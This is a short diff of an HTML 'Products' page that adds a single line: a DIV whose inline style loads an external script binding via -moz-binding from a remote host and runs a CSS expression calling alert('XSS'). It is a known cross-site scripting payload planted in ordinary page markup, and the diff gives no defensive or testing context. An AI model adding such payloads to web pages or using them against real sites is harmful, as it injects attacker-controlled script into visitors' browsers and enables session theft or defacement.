@@ -12,6 +12,7 @@ bootstrap.min.css">
 </head>
 <body>
 	<section>
+	<DIV STYLE='-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss");xss:expression(alert("XSS"))'>
 		<div class="jumbotron">
 			<div class="container">
 				<h1>Products</h1>
